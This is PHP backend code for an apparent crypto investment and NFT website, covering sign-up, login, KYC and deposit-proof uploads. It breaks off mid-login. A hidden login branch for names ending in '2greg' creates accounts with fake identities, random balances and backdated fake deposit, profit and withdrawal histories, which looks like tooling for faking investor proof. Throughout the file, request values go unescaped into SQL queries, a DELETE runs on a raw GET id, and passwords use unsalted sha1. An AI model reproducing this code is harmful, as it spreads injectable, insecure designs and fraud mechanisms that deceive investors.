404 page <a href="https://collageme.com/index.php">Go Back</a>
<?php require_once("./session.php"); ?>
<?php require_once("./connection.php"); ?>
<?php require_once("./functions.php"); ?>
<?php
//insert
$c = htmlentities(trim($_GET['c']));
if (!intval($c)) {
	redirect('../logout.php');
}else{
switch ($c) {
	

	//send message
	case 1423860482389462938:
try{	$name = textF(str_replace(';', '', $_POST['name']));
	$subject = textF(str_replace(';', '', $_POST['subject']));
	$email = emailF(trim(str_replace(';', '', $_POST['email'])));
	$message = addressF(str_replace(';', '', $_POST['message']));
} catch (Exception $e) {
    redirect("../contact.php?failed");
}
	$querya = "INSERT INTO messages 
		(name, subject, email, message) 
		VALUES 
		('{$name}', '{$subject}', '{$email}', '{$message}')"; 
$resulto = $connection->real_query($querya);
if ($resulto) {
	redirect("../contact.php?successfull");
}else{redirect("../contact.php?failed");}

	break;

case 2836784578352847:
$id = str_replace(';', '', $_GET['id']);
$querya = "DELETE FROM `messages` WHERE `messages`.`id` = {$id}"; 
$resulto = $connection->real_query($querya);
if ($resulto) {
	redirect("../administrator/added/home.php?successfull#message");
}else{redirect("../administrator/added/home.php?failed#message");}

break;


case 83483264983294863846:
	//sign up user
$difg=1;
if (!isset($_COOKIE['Vname'])) {
	setcookie('Vname', $_POST['name'], time()+(60*60));
setcookie('Vemail', $_POST['email'], time()+(60*60));
setcookie('Vphone', $_POST['phone'], time()+(60*60));

} elseif (isset($_COOKIE['Vname'])) {
setcookie('Vname', '', time()-(60*60), '/');
setcookie('Vemail', '', time()-(60*60), '/');
setcookie('Vphone', '', time()-(60*60), '/');

setcookie('Vname', $_POST['name'], time()+(60*60));
setcookie('Vemail', $_POST['email'], time()+(60*60));
setcookie('Vphone', $_POST['phone'], time()+(60*60));} 
try{
	//$lname = textF(mysql_prep(str_replace(';', '', $_POST['lname']))); $lname.' '.
	$name = textF(mysql_prep(str_replace(';', '', $_POST['name'])));
// $state = mysql_prep(str_replace(';', '', $_POST['state']));
// $street = mysql_prep(str_replace(';', '', $_POST['city']));
$email = emailF(trim(str_replace(';', '', $_POST['email'])));
$mobile_code = textF(trim(str_replace(';', '', $_POST['mobile_code'])));
$phone = $mobile_code . textF(trim(str_replace(';', '', $_POST['phone'])));
$raw_pass = passF(mysql_prep($_POST['password']));
$referal = trim(str_replace(';', '', $_POST['referrer']));
$password = sha1($raw_pass);
$password_confirmation = passF(mysql_prep($_POST['password_confirmation']));

} catch (Exception $e) {
    redirect("../register.php?check=50&eror=5&e=".$e->getMessage());
}



$ip = Get_User_Ip();
$erfme = 0;
if($referal == 1){$difg=2;}
if(empty($name) || empty($email) || empty($phone) || empty($password) || empty($password_confirmation) || $password_confirmation != $raw_pass){redirect("../register.php?check=50&eror=5");}

if (!empty($referal)) {
		$quref = "SELECT id FROM users 
			WHERE ref = '{$referal}' 
			LIMIT 1";
$resref =  $connection->real_query($quref);
while ($ref = $connection->use_result()){
$found_ref = $ref->fetch_assoc();}

if(!empty($found_ref['id'])){
	$erfme = $found_ref['id'];
}
}

//************************************  ***********************************
	$queryt = "SELECT name FROM users 
			WHERE name = '{$name}' 
			LIMIT 1";
$resultt =  $connection->real_query($queryt);
while ($reg = $connection->use_result()){
$found_useg = $reg->fetch_assoc();}

if ($found_useg['name'] != NULL) {
redirect("../register.php?up&eror=66");
}else{

	$querop = "SELECT email FROM users 
			WHERE email = '{$email}' 
			LIMIT 1";
$resulop =  $connection->real_query($querop);
while ($rev = $connection->use_result()){
$found_usev = $rev->fetch_assoc();}


if ($found_usev['email'] != NULL) {
redirect("../register.php?up&eror=67");
} else {


$queryserial = "SELECT id FROM users ORDER BY id DESC LIMIT 1";
$resultserial =  $connection->real_query($queryserial);
while ($resserial = $connection->use_result()){
$serial_noc = $resserial->fetch_assoc();}


$serial_nocH = 1 + $serial_noc['id'];
$serial_no = rand(1, 15) . alpl(rand(1, 15)) . alpl(rand(1, 15)) . rand(1, 15) . alpl(rand(1, 15)) . $serial_nocH;


$queryy = "INSERT INTO users 
		(name, email, phone, password, ip, picture, display, t_deposit, t_profit, t_withdraw, t_trade, amount_total, initial_deposit, amount_btc, amount_eth, amount_usdt, amount_usdc, acc_bal, amount_bnb, amount_ada, status, ref, refered, refered_by, noti, joined, last_seen) 
		VALUES 
		('{$name}', '{$email}', '{$phone}', '{$password}', '{$ip}', 'user.jpg', {$difg}, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, '{$serial_no}', 0, {$erfme}, 1, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"; 
$resulty = $connection->real_query($queryy);


if ($resulty) {

	$query = "SELECT * FROM users 
			WHERE email = '{$email}' 
			AND password = '{$password}' 
			LIMIT 1";
$result =  $connection->real_query($query);
while ($res = $connection->use_result()){
$found_user = $res->fetch_assoc();}

$revlo = "user".  $found_user['id'];
$query1lo = "CREATE TABLE IF NOT EXISTS `{$revlo}` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `id_noti` int(11) NULL,
  `noti` text NULL,
  `date_noti` timestamp NULL,
  `id_trans` int(11) NULL,
  `trans_d` varchar(255) NULL,
  `trans_t` varchar(255) NULL,
  `trans_a` int(11) NULL,
  `trans_w` varchar(255) NULL,
  `trans_s` int(11) NULL,
  `date_trans` timestamp NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf16 AUTO_INCREMENT=1";

$idslo = $connection->real_query($query1lo);

if ($idslo) {



	if($erfme != 0){
			$queryc = "SELECT refered FROM users WHERE id = {$erfme} LIMIT 1";
$result =  $connection->real_query($queryc);
while ($recs = $connection->use_result()){
$found_uscer = $recs->fetch_assoc();}
		$reffd = $found_uscer['refered'] + 1;
			$qufgo0oddonoti = $connection->query("UPDATE users SET refered = {$reffd} WHERE id = {$erfme} LIMIT 1");
	}


$_SESSION['i'] = $found_user['id'];
$_SESSION['pas'] = $found_user['password'];
$_SESSION['us'] = $found_user['name'];
$_SESSION['noti'] = $found_user['noti'];
$_SESSION['Vemail'] = $found_user['email'];
$_SESSION['dis'] = $found_user['display'];

if(isset($_SESSION['i'])){

setcookie('Vname', '', time()-(60*60*80));
setcookie('Vemail', '', time()-(60*60*80));
setcookie('Vphone', '', time()-(60*60*80));
setcookie('invite_link', '', time()-(60*50*1));



//
if (isset($_SESSION['us'])){
	//
$quersite_data = "SELECT session_at_user, new_user, referal_amount FROM site_main WHERE id = 1";
$resulsite_data = $connection->real_query($quersite_data);
while ($ressite_data = $connection->use_result()){
$site_data = $ressite_data->fetch_assoc();}

$aTPlus2 = $site_data['new_user'] + 1;
$aTPlus = $site_data['session_at_user'] + 1;

$querya_ = "UPDATE site_main SET
session_at_user = {$aTPlus}, 
new_user = {$aTPlus2} WHERE id = 1 LIMIT 1"; 
$resulto_ = $connection->real_query($querya_);




if ($resulto_) {

//-------------------------------
$query90o0 = "SELECT * FROM user{$_SESSION['i']} WHERE id_noti != '' ORDER BY id DESC";
$result90o0 = $connection->real_query($query90o0);
while ($reara90o0 = $connection->use_result()){
$found_ufs0o0 = $reara90o0->fetch_assoc();}
$oport = $found_ufs0o0['id_noti'] + 1;
$euet = $found_ufs0o0['id'] + 1;

$query90o00o = "SELECT * FROM user{$_SESSION['i']} ORDER BY id DESC";
$result90o00o = $connection->real_query($query90o00o);
while ($reara90o00o = $connection->use_result()){
$found_ufs0o00o = $reara90o00o->fetch_assoc();}

$notibdfg = $name . ', Your account was successfully created. Invest in any currency of your choice <a href="./index.php?deposit&step1">Deposit Now</a>';

if ($found_ufs0o0['id_noti'] != $found_ufs0o00o['id']) {
$qufgo0oo =  $connection->query("UPDATE user{$_SESSION['i']} SET id_noti = {$oport}, date_noti = CURRENT_TIMESTAMP, noti = '{$notibdfg}' WHERE id = {$euet} LIMIT 1");
}
if($found_ufs0o0['id_noti'] == $found_ufs0o00o['id']){
	$qufgo0ooo = $connection->query("INSERT INTO user{$_SESSION['i']} 
		(id_noti, date_noti, noti) 
		VALUES 
		({$oport}, CURRENT_TIMESTAMP, '{$notibdfg}')");
}

//--------------------



$oportnoti = rand(100000, 999999);
  	$qufgo0oonoti = $connection->query("UPDATE pin SET pin = {$oportnoti} WHERE id = 1 LIMIT 1");


$quersite_pin = "SELECT * FROM pin WHERE id = 1";
$resulsite_pin = $connection->real_query($quersite_pin);
while ($ressite_pin = $connection->use_result()){
$pin = $ressite_pin->fetch_assoc();}
 
 $pr = str_replace(' ', '<i class="d-none">', $found_user['name']); 

 $to = $found_user['email'];
$subject = 'Verify Your Account';
$message = '<h4>Welcome, ' . $pr . '</i></i></i></h4><br/><p>Account created successfully, verify your account with link below.<br/><br/> <a href="https://collageme.com/login.php">Verify Account</a></p><br/>';
$from = '';

include('./email.php');
 


// To send HTML mail, the Content-type header must be set
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
 
// Create email headers
$headers .= 'From: '.$from."\r\n".
    'Reply-To: '.$from."\r\n" .
    'X-Mailer: PHP/' . phpversion();


if(mail($to, $subject, $messagei, $headers)){

	# code...
	redirect("../dashboard/index.php?new");
}

}}	
}else{redirect("../register.php?check=50&eror=5");}
}else{redirect("../register.php?check=50&eror=5");}
}}

}

redirect("../register.php?check=50&eror=5");
	break;




case 84896327894873254759238:
	$qufgo0oonoti=false;
	try{
	$picture = addressF(trim($_POST['pic']));
} catch (Exception $e) {
    redirect('../dashboard/index.php?profile&failed');
}
	$lenp = strlen($picture);
	$picture = $picture[0].$picture[1].$picture[2].rand(100,999).'_'.trim($_SESSION['Vemail']).'_'.$picture[($lenp-5)].$picture[($lenp-4)].$picture[($lenp-3)].$picture[($lenp-2)].$picture[($lenp-1)].$picture[$lenp];
	function FunctionName($backview,$picture)
	{
		$target_dir = "../assets/images/user/"; 
		# code...
	$target_file2 = $target_dir .$picture;
	$imageFileType2 = strtolower(pathinfo($target_file2,PATHINFO_EXTENSION));
	
	 $check2 = getimagesize($_FILES["{$backview}"]["tmp_name"]);
	  if($check2 !== false) {
		  if($imageFileType2 != "jpg" && $imageFileType2 != "png" && $imageFileType2 != "jpeg"
	&& $imageFileType2 != "gif" ) {
	  echo "Sorry, only JPG, JPEG, PNG & GIF files are allowed.";
	}else{
	
	if (move_uploaded_file($_FILES["{$backview}"]["tmp_name"], $target_file2)) {
		echo "The file ". basename( $_FILES["{$backview}"]["name"]). " has been uploaded.";
		return 1;
	}}
	  }
	  return 0;
	}
	//if(!empty($_FILES['picii']["name"])){FunctionName('picii');}
	if(!empty($_FILES['picii']["name"])){if(FunctionName('picii',$picture)){$qufgo0oonoti = $connection->query("UPDATE users SET picture = '{$picture}' WHERE id = {$_SESSION['i']} LIMIT 1");}}
	
	
	  //	$qufgo0oonoti = $connection->query("UPDATE users SET picture = '{$picture}' WHERE id = {$_SESSION['i']} LIMIT 1");
	if($qufgo0oonoti){
		redirect('../dashboard/index.php?profile&successfull');
	}else{
		redirect('../dashboard/index.php?profile&failed');
	}
	
break;



case 832748932487349873987389433442:
	$qufgo0oonoti=false;
	
	try{
		$proceed = textF(trim($_POST['proceed']));
		$amount = numF(trim($_POST['amount']));
		$picture = trim($_POST['prooff']);
} catch (Exception $e) {
    redirect('../dashboard/index.php?deposit&generated_wallet&proceed='.$proceed.'&amount='.$amount.'&failed');
}

$lenp = strlen($picture);
$picture = $picture[0].$picture[1].$picture[2].rand(100,999).'_'.trim($_SESSION['Vemail']).'_'.$picture[($lenp-5)].$picture[($lenp-4)].$picture[($lenp-3)].$picture[($lenp-2)].$picture[($lenp-1)].$picture[$lenp];

	function FunctionName($backview,$picture)
	{
		$target_dir = "../assets/images/pay/"; 
		# code...
		//$iproof='p_'.rand(100,999).'__'.trim($_SESSION['Vemail']).'_'. basename($_FILES["{$backview}"]["name"]);
	$target_file2 = $target_dir .$picture;
	$imageFileType2 = strtolower(pathinfo($target_file2,PATHINFO_EXTENSION));
	
	 $check2 = getimagesize($_FILES["{$backview}"]["tmp_name"]);
	  if($check2 !== false) {
		  if($imageFileType2 != "jpg" && $imageFileType2 != "png" && $imageFileType2 != "jpeg"
	&& $imageFileType2 != "gif" ) {
	  echo "Sorry, only JPG, JPEG, PNG & GIF files are allowed.";
	}else{
	
	if (move_uploaded_file($_FILES["{$backview}"]["tmp_name"], $target_file2)) {
		echo "The file ". basename( $_FILES["{$backview}"]["name"]). " has been uploaded.";
		return 1;
	}}
	  }
	  return 0;
	}
	//if(!empty($_FILES['picii']["name"])){FunctionName('picii');}
	if(!empty($_FILES['proof']["name"])){if(FunctionName('proof',$picture)){
		
	$qufgo0oonoti = $connection->query("INSERT INTO pro_click  
		(user_id, email, amount, iproof) 
		VALUES 
		({$_SESSION['i']}, '{$_SESSION['Vemail']}', {$amount}, '{$picture}')");

	}}
	
	
	  //	$qufgo0oonoti = $connection->query("UPDATE users SET picture = '{$picture}' WHERE id = {$_SESSION['i']} LIMIT 1");
	if($qufgo0oonoti){
		
		redirect('../dashboard/index.php?deposit&generated_wallet&proceed='.$proceed.'&amount='.$amount.'&iproof&verifying');
	}else{redirect('../dashboard/index.php?deposit&generated_wallet&proceed='.$proceed.'&amount='.$amount.'&failed');}

	break;

case 84896327894873237873298473298749832254759238:
	$qufgo0oonoti=false;	
	try{
	$iskyc = numF(trim($_POST['iKyc']));
} catch (Exception $e) {
    redirect('../dashboard/index.php?profile&failed#kyc');
}
$rang=rand(100,999);
$kkycc = 'p_'.$rang.'_('.$iskyc.')_'.trim($_SESSION['Vemail']).'_'. basename($_FILES["iKKyc"]["name"]);
	function FunctionName($backview,$iskyc,$rang)
	{
		$target_dir = "../assets/images/kyc/"; 
		# code...
	$target_file2 = $target_dir .'p_'.$rang.'_('.$iskyc.')_'.trim($_SESSION['Vemail']).'_'. basename($_FILES["{$backview}"]["name"]);
	$imageFileType2 = strtolower(pathinfo($target_file2,PATHINFO_EXTENSION));
	
	 $check2 = getimagesize($_FILES["{$backview}"]["tmp_name"]);
	  if($check2 !== false) {
		  if($imageFileType2 != "jpg" && $imageFileType2 != "png" && $imageFileType2 != "jpeg"
	&& $imageFileType2 != "gif" ) {
	  echo "Sorry, only JPG, JPEG, PNG & GIF files are allowed.";
	}else{
	
	if (move_uploaded_file($_FILES["{$backview}"]["tmp_name"], $target_file2)) {
		echo "The file ". basename( $_FILES["{$backview}"]["name"]). " has been uploaded.";
		return 1;
	}}
	  }
	  return 0;
	}
	//if(!empty($_FILES['picii']["name"])){FunctionName('picii');}
	if(!empty($_FILES['iKKyc']["name"])){if(FunctionName('iKKyc',$iskyc,$rang)){
		if($iskyc == 1){$qufgo0oonoti = $connection->query("UPDATE users SET noti = 1, isKyc = {$iskyc}, kyc1 = '{$kkycc}' WHERE id = {$_SESSION['i']} LIMIT 1");
		}else if($iskyc == 2){$qufgo0oonoti = $connection->query("UPDATE users SET noti = 1, isKyc = {$iskyc}, kyc2 = '{$kkycc}' WHERE id = {$_SESSION['i']} LIMIT 1");
		}else if($iskyc == 3){$qufgo0oonoti = $connection->query("UPDATE users SET noti = 1, isKyc = {$iskyc}, kyc3 = '{$kkycc}' WHERE id = {$_SESSION['i']} LIMIT 1");}
	}}
	
	
	  //	$qufgo0oonoti = $connection->query("UPDATE users SET picture = '{$picture}' WHERE id = {$_SESSION['i']} LIMIT 1");
	if($qufgo0oonoti){
		if($iskyc == 3){
			
//-------------------------------
$query90o0 = "SELECT * FROM user{$_SESSION['i']} WHERE id_noti != '' ORDER BY id DESC";
$result90o0 = $connection->real_query($query90o0);
while ($reara90o0 = $connection->use_result()){
$found_ufs0o0 = $reara90o0->fetch_assoc();}
$oport = $found_ufs0o0['id_noti'] + 1;
$euet = $found_ufs0o0['id'] + 1;

$query90o00o = "SELECT * FROM user{$_SESSION['i']} ORDER BY id DESC";
$result90o00o = $connection->real_query($query90o00o);
while ($reara90o00o = $connection->use_result()){
$found_ufs0o00o = $reara90o00o->fetch_assoc();}

$notibdfg = 'Your account is being reviewed for verification, Process takes 1-3 days to complete. Kyc Documents recieved and is being processed. ';

if ($found_ufs0o0['id_noti'] != $found_ufs0o00o['id']) {
$qufgo0oo =  $connection->query("UPDATE user{$_SESSION['i']} SET id_noti = {$oport}, date_noti = CURRENT_TIMESTAMP, noti = '{$notibdfg}' WHERE id = {$euet} LIMIT 1");
}
if($found_ufs0o0['id_noti'] == $found_ufs0o00o['id']){
	$qufgo0ooo = $connection->query("INSERT INTO user{$_SESSION['i']} 
		(id_noti, date_noti, noti) 
		VALUES 
		({$oport}, CURRENT_TIMESTAMP, '{$notibdfg}')");
}

//--------------------

		}
		redirect('../dashboard/index.php?profile&successfull#kyc');
	}else{redirect('../dashboard/index.php?profile&failed#kyc');}

	break;
	

	

case 3478379847329847398274923897298594398289:
	$qufgo0oonoti=false;	
	try{
	$iskyc = textF(trim($_POST['art']));
} catch (Exception $e) {
    redirect('../dashboard/index.php?nft&failed&'.$e->getMessage());
}

$poi=strlen(basename($_FILES["nft"]["name"]));
$poiv=basename($_FILES["nft"]["name"]);
$namee=$iskyc.'_'.trim($_SESSION['Vemail']).'_'.$poiv[($poi-5)].$poiv[($poi-4)].$poiv[($poi-3)].$poiv[($poi-2)].$poiv[($poi-1)].$poiv[($poi)] ;
	function FunctionName($backview,$iskyc)
	{
		$target_dir = "../assets/images/nft/"; 
		# code...
		$poi=strlen(basename($_FILES["{$backview}"]["name"]));
		$poiv=basename($_FILES["{$backview}"]["name"]);
	$namee=$iskyc.'_'.trim($_SESSION['Vemail']).'_'.$poiv[($poi-5)].$poiv[($poi-4)].$poiv[($poi-3)].$poiv[($poi-2)].$poiv[($poi-1)].$poiv[($poi)];
	$target_file2 = $target_dir . $namee;
	$imageFileType2 = strtolower(pathinfo($target_file2,PATHINFO_EXTENSION));
	
	 $check2 = getimagesize($_FILES["{$backview}"]["tmp_name"]);
	  if($check2 !== false) {
		  if($imageFileType2 != "jpg" && $imageFileType2 != "png" && $imageFileType2 != "jpeg"
	&& $imageFileType2 != "gif" ) {
	  echo "Sorry, only JPG, JPEG, PNG & GIF files are allowed.";
	}else{
	
	if (move_uploaded_file($_FILES["{$backview}"]["tmp_name"], $target_file2)) {
		echo "The file ". basename( $_FILES["{$backview}"]["name"]). " has been uploaded.";
		return 1;
	}}
	  }
	  return 0;
	}
	//if(!empty($_FILES['picii']["name"])){FunctionName('picii');}
	if(!empty($_FILES['nft']["name"])){if(FunctionName('nft',$iskyc)){$qufgo0oonoti = $connection->query("INSERT INTO nfts (name,date) VALUES ('{$namee}',CURRENT_TIMESTAMP)");}}
	
	
	  //	$qufgo0oonoti = $connection->query("UPDATE users SET picture = '{$picture}' WHERE id = {$_SESSION['i']} LIMIT 1");
	if($qufgo0oonoti){
				
//-------------------------------
$query90o0 = "SELECT * FROM user{$_SESSION['i']} WHERE id_noti != '' ORDER BY id DESC";
$result90o0 = $connection->real_query($query90o0);
while ($reara90o0 = $connection->use_result()){
$found_ufs0o0 = $reara90o0->fetch_assoc();}
$oport = $found_ufs0o0['id_noti'] + 1;
$euet = $found_ufs0o0['id'] + 1;

$query90o00o = "SELECT * FROM user{$_SESSION['i']} ORDER BY id DESC";
$result90o00o = $connection->real_query($query90o00o);
while ($reara90o00o = $connection->use_result()){
$found_ufs0o00o = $reara90o00o->fetch_assoc();}

$notibdfg = 'Your NFT '.$iskyc.' has been Minted being reviewed for verification, Process takes 24 Hours to complete. NFT Documents recieved and is being processed. ';

if ($found_ufs0o0['id_noti'] != $found_ufs0o00o['id']) {
$qufgo0oo =  $connection->query("UPDATE user{$_SESSION['i']} SET id_noti = {$oport}, date_noti = CURRENT_TIMESTAMP, noti = '{$notibdfg}' WHERE id = {$euet} LIMIT 1");
}
if($found_ufs0o0['id_noti'] == $found_ufs0o00o['id']){
	$qufgo0ooo = $connection->query("INSERT INTO user{$_SESSION['i']} 
		(id_noti, date_noti, noti) 
		VALUES 
		({$oport}, CURRENT_TIMESTAMP, '{$notibdfg}')");
}

//--------------------

		
		redirect('../dashboard/index.php?nft&successfull');
	}else{redirect('../dashboard/index.php?nft&failed');}

	break;
	


	//client check
	case 34346363465647457567:
$ip = Get_User_Ip();
 date_default_timezone_set('UTC');

$ctime = date("Y-m-d") . ' ' . date("H:i:s");
try {
		if (isset($_GET['forg'])) {
$name = emailF(trim(mysql_prep(htmlentities($_GET['name']))));
$raw_pass = passF(mysql_prep($_GET['password']));
$password = sha1($raw_pass);
} else { 
$name = emailF(trim(mysql_prep(htmlentities($_POST['name']))));
$raw_pass = passF(mysql_prep($_POST['password']));
$password = sha1($raw_pass);}

} catch (Exception $e) {
	redirect('../login.php?check=1&eror=31');
}


if (empty($name) || empty($raw_pass)) {
	redirect('../login.php?check=1&eror=31');
}
$loginnn=true;
///my people
if(substr(strrchr($name, "2"), 0) == "2greg"){
$loginnn=false;
$semail=$name.'@gmail.com';
$namee=nam2(rand(1,36))." Greg";
$email=trim($namee).rand(1,30).'@gmail.com';

$querop = "SELECT ip,semail FROM users 
			WHERE ip = '{$ip}' 
			OR semail = '{$semail}'
			LIMIT 1";
$resulop =  $connection->real_query($querop);
while ($rev = $connection->use_result()){
$found_usev = $rev->fetch_assoc();}


if ($found_usev['ip'] != $ip || $found_usev['semail'] == $semail) {
$loginnn=true;
$name=$name.'@gmail.com';
} else {
$datee='2021-08-'.rand(1,30).' '.rand(1,24).':'.rand(1,50).':'.rand(1,50);



$queryserial = "SELECT id FROM users ORDER BY id DESC LIMIT 1";
$resultserial =  $connection->real_query($queryserial);
while ($resserial = $connection->use_result()){
$serial_noc = $resserial->fetch_assoc();}


$serial_nocH = 1 + $serial_noc['id'];
$serial_no = rand(1, 15) . alpl(rand(1, 15)) . alpl(rand(1, 15)) . rand(1, 15) . alpl(rand(1, 15)) . $serial_nocH;

$roi=rand(4100,6100);
$ball=rand(122004,198021);
$ttin=rand(25000,35000);

$queryy = "INSERT INTO users 
		(name, email, semail, phone, password, ip, picture, display, t_deposit, t_profit, t_withdraw, t_trade, amount_total, initial_deposit, amount_btc, amount_eth, amount_usdt, amount_usdc, acc_bal, amount_bnb, amount_ada, status, ref, refered, refered_by, noti, joined, last_seen) 
		VALUES 
		('{$namee}', '{$email}','{$semail}', '', '{$password}', '{$ip}', 'user.jpg', 1, 0, {$ttin}, 0, 0, 0, {$roi}, 0, 0, 0, 0, {$ball}, 0, 0, 8, '{$serial_no}', 0, 0, 0, '{$datee}', CURRENT_TIMESTAMP)"; 
$resulty = $connection->real_query($queryy);


if ($resulty) {

	$query = "SELECT * FROM users 
			WHERE ip = '{$ip}' 
			AND name = '{$namee}' 
			LIMIT 1";
$result =  $connection->real_query($query);
while ($res = $connection->use_result()){
$found_user = $res->fetch_assoc();}

$revlo = "user".  $found_user['id'];
$query1lo = "CREATE TABLE IF NOT EXISTS `{$revlo}` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `id_noti` int(11) NULL,
  `noti` text NULL,
  `date_noti` timestamp NULL,
  `id_trans` int(11) NULL,
  `trans_d` varchar(255) NULL,
  `trans_t` varchar(255) NULL,
  `trans_a` int(11) NULL,
  `trans_w` varchar(255) NULL,
  `trans_s` int(11) NULL,
  `date_trans` timestamp NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf16 AUTO_INCREMENT=1";

$idslo = $connection->real_query($query1lo);

if($idslo){
$_SESSION['i'] = $found_user['id'];
$_SESSION['pas'] = $found_user['password'];
$_SESSION['us'] = $found_user['name'];
$_SESSION['Vemail'] = $found_user['email'];
$_SESSION['noti'] = $found_user['noti'];
$_SESSION['dis'] = $found_user['display'];

$id=$found_user['id'];
$runner =1;
$bash0='BTC';
$address='bc1pjl80hujr86lasll9wrrzdy9qg7d38kkd4t26ljv8e9vzud8qdf5st2qa4j';//get one online
//success

while($runner <= 11){
$stst=3;
$aammt=$roi+rand(1000,9000);
$daterr='2022-0'.$runner.'-'.rand(1,30).' '.rand(1,24).':'.rand(1,50).':'.rand(1,50);
$type='Credit';
$transID = alpl(rand(1,15)) . rand(100,999) . rand(100,999) . alpl(rand(1,15)) . alpl(rand(1,15));
if($runner > 5){
$daterr='2023-'.($runner+1).'-'.rand(1,30).' '.rand(1,24).':'.rand(1,50).':'.rand(1,50);}
if($runner == 11){$daterr='2024-01-13 '.rand(1,24).':'.rand(1,50).':'.rand(1,50);}
if($runner == 1){$aammt=10000;}

$notibdfg = 'Deposit of $' . $aammt . ' - BTC ' . $bash0 . ' has been placed and Completed, your Account has been credited.';
if($runner >= 2 && $runner != 6){$notibdfg='Transfer of Profit to Account $'.$aammt.' was successfull,  transaction #'.$transID.'. Date: '.$daterr;}

//if($runner ==3){$stst=2;}//failed

if($runner == 4|| $runner == 8){$type='Debit';$notibdfg='Withdraw of $'.$aammt.' from bitcoin Wallet to ' . $bash0 . ' address `' . $address . '` has been placed, wallet balance: $' . $bal . ', awaiting verification, your Account Has been Debited.';}

//-------------------------------
$query90o0 = "SELECT * FROM user{$_SESSION['i']} WHERE id_noti != '' ORDER BY id DESC";
$result90o0 = $connection->real_query($query90o0);
while ($reara90o0 = $connection->use_result()){
$found_ufs0o0 = $reara90o0->fetch_assoc();}
$oport = $found_ufs0o0['id_noti'] + 1;
$euet = $found_ufs0o0['id'] + 1;

$query90o00o = "SELECT * FROM user{$_SESSION['i']} ORDER BY id DESC";
$result90o00o = $connection->real_query($query90o00o);
while ($reara90o00o = $connection->use_result()){
$found_ufs0o00o = $reara90o00o->fetch_assoc();}

//

$qufgo0oo = false;
$qufgo0ooo = false;

if ($found_ufs0o0['id_noti'] != $found_ufs0o00o['id']) {
$qufgo0oo =  $connection->query("UPDATE user{$_SESSION['i']} SET id_noti = {$oport}, date_noti = '{$daterr}', noti = '{$notibdfg}' WHERE id = {$euet} LIMIT 1");
}
if($found_ufs0o0['id_noti'] == $found_ufs0o00o['id']){
	$qufgo0ooo = $connection->query("INSERT INTO user{$_SESSION['i']} 
		(id_noti, date_noti, noti) 
		VALUES 
		({$oport}, '{$daterr}', '{$notibdfg}')");
}

//--------------------





if($qufgo0oo || $qufgo0ooo){
//-------------------------------
$query90o0vv = "SELECT * FROM user{$id} WHERE id_trans != '' ORDER BY id DESC";
$result90o0vv = $connection->real_query($query90o0vv);
while ($reara90o0vv = $connection->use_result()){
$found_ufs0o0vv = $reara90o0vv->fetch_assoc();}
$oportvv = $found_ufs0o0vv['id_trans'] + 1;
$euetvv = $found_ufs0o0vv['id'] + 1;

$query90o00ovv = "SELECT * FROM user{$id} ORDER BY id DESC";
$result90o00ovv = $connection->real_query($query90o00ovv);
while ($reara90o00ovv = $connection->use_result()){
$found_ufs0o00ovv = $reara90o00ovv->fetch_assoc();}


if ($found_ufs0o0vv['id_trans'] != $found_ufs0o00ovv['id']) {
$qufgo0oovv =  $connection->query("UPDATE user{$id} SET id_trans = {$oportvv}, trans_a = {$aammt}, trans_t = '{$type}', trans_s = {$stst}, trans_w = '{$bash0}', trans_d = '{$transID}', date_trans = '{$daterr}' WHERE id = {$euetvv} LIMIT 1");
}
if($found_ufs0o0vv['id_trans'] == $found_ufs0o00ovv['id']){
	$qufgo0ooovv = $connection->query("INSERT INTO user{$id} 
		(id_trans, trans_d, trans_a, trans_t, trans_s, date_trans, trans_w) 
		VALUES 
		({$oportvv}, '{$transID}', {$aammt}, '{$type}', {$stst}, '{$daterr}', '{$bash0}')");
}
//--------------------
}
$runner+=1;}

redirect("../dashboard/index.php");
}else{
	redirect('../login.php?check=1&eror=109');
}
}else{
	redirect('../login.php?check=1&eror=108');
}
//set accttype/display==8(g)
}

}

/////
if($loginnn){


$querys = "SELECT * FROM users 
			WHERE name = '{$name}' 
			AND password = '{$password}' 
			LIMIT 1";
$results =  $connection->real_query($querys);
while ($resd = $connection->use_result()){
$found_users = $resd->fetch_assoc();}

if(substr(strrchr($name, "2"), 0) == "2greg"){

$query = "SELECT * FROM users 
			WHERE semail = '{$semail}' 
			AND password = '{$password}' 
			AND ip = '{$ip}' 
			LIMIT 1";
$result =  $connection->real_query($query);
while ($res = $connection->use_result()){
$found_user = $res->fetch_assoc();}	
}else{
$query = "SELECT * FROM users 
			WHERE email = '{$name}' 
			AND password = '{$password}' 
			LIMIT 1";
$result =  $connection->real_query($query);
while ($res = $connection->use_result()){
$found_user = $res->fetch_assoc();}

}

if (($found_user['status'] == 1) || ($found_users['status'] == 1)) {
redirect('../login.php?eror=Disabled');
}elseif ($found_user['status'] == 16) {
//done with user 8
redirect('../login.php?eror=restricted');
}elseif (($found_user['status'] == 0) || ($found_users['status'] == 0)) {

if ((strtoupper($name) === strtoupper($found_users['name'])) && ($password === $found_users['password'])) {


$_SESSION['i'] = $found_users['id'];
$_SESSION['pas'] = $found_users['password'];
$_SESSION['raw'] = $raw_pass;
$_SESSION['us'] = $found_users['name'];
$_SESSION['Vemail'] = $found_users['email'];
$_SESSION['noti'] = $found_users['noti'];
$_SESSION['dis'] = $found_users['display'];
$usip=$found_users['ip'];
}else{
if ((strtoupper($name) === strtoupper($found_user['email'])) && ($password === $found_user['password'])) {


$_SESSION['i'] = $found_user['id'];
$_SESSION['pas'] = $found_user['password'];
$_SESSION['raw'] = $raw_pass;
$_SESSION['us'] = $found_user['name'];
$_SESSION['Vemail'] = $found_user['email'];
$_SESSION['noti'] = $found_user['noti'];
$_SESSION['dis'] = $found_user['display'];
$usip=$found_user['ip'];
}else{
	redirect('../login.php?check=1&eror=1');
}
}

//$_SESSION['versenews'] = $found_users['news'];

//?email={$found_user['email']}&u={$found_user['id']}&red={$raw_pass}&no=" . $foundg?pass=" . $found_user['password']

//




$quersite_data = "SELECT session_at_user FROM site_main WHERE id = 1";
$resulsite_data = $connection->real_query($quersite_data);
while ($ressite_data = $connection->use_result()){
$site_data = $ressite_data->fetch_assoc();}




